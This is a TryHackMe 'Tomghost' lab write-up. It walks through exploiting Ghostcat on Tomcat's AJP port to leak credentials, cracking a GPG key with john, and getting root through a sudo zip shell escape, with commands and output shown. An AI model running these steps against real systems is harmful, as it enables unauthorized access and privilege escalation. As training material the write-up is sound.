+++
title = "THM | Thomghost"
+++

# THM Thomghost writeup

## 8009 : tomcat

use exploit `48143.py` from [exploit db](https://exploit-db.com) and get :

```xml
Getting resource at ajp13://10.10.228.43:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	   skyfuck:passwd
  </description>

</web-app>
```

## 22 : ssh

login using creds `ssh skyfuck@$IP` then it's the `privesc` parts :

### privesc:

find two files : `credential.gpg` and `tryhackme.asc` then use john for decrypt the password of the gpg key :

```bash
gpg2john tryhackme.asc > key.hash
john -wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

the use gpg to decrypt the file `credential.gpg` :

```
┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
└─$ gpg --import private.key       
gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
gpg: clef 8F3DA3DEC6707170 : clef secrète importée
gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
gpg:       Quantité totale traitée : 2
gpg:                 non modifiées : 2
gpg:           clefs secrètes lues : 1
gpg:      clefs secrètes importées : 1
                                                                                                                                                                        
┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
└─$ gpg --decrypt credential.pgp
gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
            dans les préférences du destinataire
gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
      « tryhackme <stuxnet@tryhackme.com> »
merlin:<passwd>
```

and login to ssh:

```
┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
└─$ ssh merlin@10.10.126.249
merlin@10.10.126.249's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sat Aug  6 06:52:00 2022 from 10.9.2.76
merlin@ubuntu:~$ cat flag.txt
<flag>
```

so now it's privesc time !

```
merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
go to [GTFOBins](https://gtfobins.github.io/gtfobins/) and search zip : [zip#sudo](https://gtfobins.github.io/gtfobins/zip/#sudo)
```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

and get the second flag:
```
# cd /root
# ls
root.txt  ufw
# cat root.txt
<flag>
```
